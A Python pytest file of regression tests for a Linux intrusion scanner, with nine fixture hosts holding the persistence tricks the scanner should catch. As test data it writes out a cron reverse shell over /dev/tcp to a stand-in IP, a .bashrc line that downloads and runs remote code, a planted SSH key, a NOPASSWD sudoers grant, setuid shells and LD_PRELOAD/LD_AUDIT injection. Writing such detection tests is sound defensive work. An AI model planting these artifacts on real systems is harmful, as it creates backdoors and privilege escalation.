"""Regression tests for the nine intrusions in the 2.3.0 practitioner review.

Each case builds the clean fixture host, adds what the intruder did, and scans
it offline through the real pipeline. Each asserts what the v3 plan promises
(docs/plans/id-registry.md §7). Until its fix lands a case is
``xfail(strict=True)``: it must fail for the reason the reviewer gave, and the
moment a fix makes it pass, the strict marker turns that into a failure that
says to remove the marker.
"""
import pytest

from tests import fixture_hosts as fh

ATTACKER_KEY = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq8Zr0v0m3d2l0dD8sQ4cWwq6S1lUe2n3bY7xJ5tQ0p "
                "backup@host")


def _host(tmp_path, extra=None, recent=(), procs=(), modes=None, base="clean"):
    files = dict(fh.HOSTS[base])
    files.update(extra or {})
    root = fh.build(tmp_path / "host", files, recent=recent)
    for p in procs:
        fh.add_process(root, *p)
    for path, mode in (modes or {}).items():
        fh.set_mode(root, path, mode)
    return root


def _findings(root, ss=None):
    live = {"ss": (ss, 0)} if ss is not None else None
    return fh.scan(root, live).findings


def _mentions(finding, text):
    return any(text in str(getattr(finding, k, "")) for k in ("artifact_path", "raw_value", "description"))


def _sev(f):
    return f.severity.value if hasattr(f.severity, "value") else str(f.severity)


# ── C1 ───────────────────────────────────────────────────────────────────────

@pytest.mark.xfail(strict=True, reason="C1 → E8-S4 SSH_KEY_INVENTORY (alpha.1)")
def test_review_c1_old_authorized_keys_new_key(tmp_path):
    """A key appended to an authorized_keys whose file is older than 7 days."""
    root = _host(tmp_path, {"/home/admin/.ssh/authorized_keys":
                            fh.ADMIN_KEY + "\n" + ATTACKER_KEY + "\n"})
    key_data = ATTACKER_KEY.split()[1]
    hits = [f for f in _findings(root) if key_data in f.raw_value]
    assert hits, "the attacker's key appears in no finding (2.3.0 skips files older than 7 days)"


# ── C2 ───────────────────────────────────────────────────────────────────────

@pytest.mark.xfail(strict=True, reason="C2 → E8-S7 processes by location (alpha.1)")
def test_review_c2_dev_shm_idle_implant(tmp_path):
    """An implant in /dev/shm with an ordinary name and no connection."""
    root = _host(tmp_path, procs=[(4242, "httpd", "/dev/shm/.cache/httpd")])
    hits = [f for f in _findings(root, ss="") if _mentions(f, "/dev/shm/.cache/httpd")]
    assert hits and _sev(hits[0]) == "HIGH", \
        "an idle /dev/shm process is reported only if its name is a known binary"


@pytest.mark.xfail(strict=True, reason="C2 → E8-S7 listeners (alpha.1)")
def test_review_c2_dev_shm_listening_bind_shell(tmp_path):
    root = _host(tmp_path, procs=[(4243, "httpd", "/dev/shm/.cache/httpd")])
    ss = ('Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n'
          'tcp   LISTEN 0      5      0.0.0.0:4444       0.0.0.0:*         '
          'users:(("httpd",pid=4243,fd=3))\n')
    hits = [f for f in _findings(root, ss=ss) if _mentions(f, "4444") or _mentions(f, "/dev/shm")]
    assert hits and _sev(hits[0]) == "HIGH", "listeners are never evaluated"


# ── C3 ───────────────────────────────────────────────────────────────────────

def test_review_c3_root_crond_dev_tcp(tmp_path):
    root = _host(tmp_path, {"/etc/cron.d/sysupd":
                            "* * * * * root bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'\n"})
    hits = [f for f in _findings(root) if f.artifact_path == "/etc/cron.d/sysupd"]
    assert hits and _sev(hits[0]) == "HIGH", \
        "CRON_ROOT_EXEC skips root-owned entries; CRON_TMP_PATH only looks for temp dirs"


# ── C4 ───────────────────────────────────────────────────────────────────────

@pytest.mark.xfail(strict=True, reason="C4 → E8-S3 unowned + recent units (beta.1, needs §2.2.6)")
def test_review_c4_tidy_root_unit_usr_local(tmp_path):
    root = _host(tmp_path, {
        "/etc/systemd/system/updater.service":
            "[Unit]\nDescription=System updater\n[Service]\nExecStart=/usr/local/sbin/updater\n"
            "[Install]\nWantedBy=multi-user.target\n",
        "/usr/local/sbin/updater": "#!/bin/sh\n"},
        recent=["/etc/systemd/system/updater.service", "/usr/local/sbin/updater"])
    assert [f for f in _findings(root) if _mentions(f, "updater.service")], \
        "none of the four systemd triggers fire on a tidy root-owned unit"


# ── C5 ───────────────────────────────────────────────────────────────────────

@pytest.mark.xfail(strict=True, reason="C5 → E8-S6 every account in SUDOERS_NOPASSWD (alpha.1)")
def test_review_c5_www_data_nopasswd_all(tmp_path):
    root = _host(tmp_path, {"/etc/sudoers.d/www": "www-data ALL=(ALL) NOPASSWD: ALL\n"})
    hits = [f for f in _findings(root) if f.rule_id == "SUDOERS_NOPASSWD" and _mentions(f, "www-data")]
    assert hits, "SUDOERS_NOPASSWD only evaluates UID >= 1000 accounts with a login shell"


# ── C6 ───────────────────────────────────────────────────────────────────────

@pytest.mark.xfail(strict=True, reason="C6 → E8-S5 account privilege rule (beta.1)")
def test_review_c6_service_account_login_shell_and_docker_group(tmp_path):
    root = _host(tmp_path, {
        "/etc/passwd": fh.STOCK_PASSWD.replace(
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
            "www-data:x:33:33:www-data:/var/www:/bin/bash"),
        "/etc/group": fh.STOCK_GROUP.replace("docker:x:998:", "docker:x:998:www-data")})
    found = _findings(root)
    assert [f for f in found if _mentions(f, "www-data") and _mentions(f, "/bin/bash")], \
        "a service account's login shell is collected but never judged"
    assert [f for f in found if _mentions(f, "docker")], "privileged-group membership is never judged"


# ── C7 ───────────────────────────────────────────────────────────────────────

@pytest.mark.xfail(strict=True, reason="C7 → E8-S8 wider setuid paths (alpha.1) + capabilities (beta.1)")
def test_review_c7_setuid_bash_var_lib_and_root(tmp_path):
    root = _host(tmp_path, {"/var/lib/.x/bash": "", "/root/.b/sh": ""},
                 modes={"/var/lib/.x/bash": 0o4755, "/root/.b/sh": 0o4755})
    found = _findings(root)
    assert [f for f in found if _mentions(f, "/var/lib/.x/bash")], "/var/lib is not searched"
    assert [f for f in found if _mentions(f, "/root/.b/sh")], "/root is not searched"


# ── C8 ───────────────────────────────────────────────────────────────────────

def test_review_c8_bashrc_process_substitution_curl(tmp_path):
    """Planted 400 days ago: age is not the reason for the miss, the regex is."""
    root = _host(tmp_path, {"/home/admin/.bashrc":
                            fh.STOCK_BASHRC + "bash <(curl -s http://198.51.100.7/x)\n"})
    hits = [f for f in _findings(root) if f.rule_id == "SHELL_RC_MODIFICATION"]
    assert hits and "<(curl" in hits[0].raw_value, \
        "the download regex only matches curl/wget piped straight into sh/bash"


# ── C9 ───────────────────────────────────────────────────────────────────────

@pytest.mark.xfail(strict=True, reason="C9 → E8-S9 unit Environment= and LD_AUDIT (beta.1)")
def test_review_c9_systemd_environment_ld_preload(tmp_path):
    root = _host(tmp_path, {
        "/etc/systemd/system/cron.service.d/env.conf":
            "[Service]\nEnvironment=LD_PRELOAD=/opt/.x/libx.so\n",
        "/etc/profile.d/audit.sh": "export LD_AUDIT=/opt/.x/libaudit.so\n"})
    found = _findings(root)
    assert [f for f in found if f.rule_id == "LD_PRELOAD_INJECT" and _mentions(f, "env.conf")], \
        "unit Environment= lines are never read"
    assert [f for f in found if _mentions(f, "LD_AUDIT")], "LD_AUDIT is not checked at all"


# ── Not a miss: guard against the fixtures themselves being noisy ───────────

def test_review_clean_fixture_host_has_no_findings(tmp_path):
    root = _host(tmp_path)
    assert _findings(root, ss="") == []
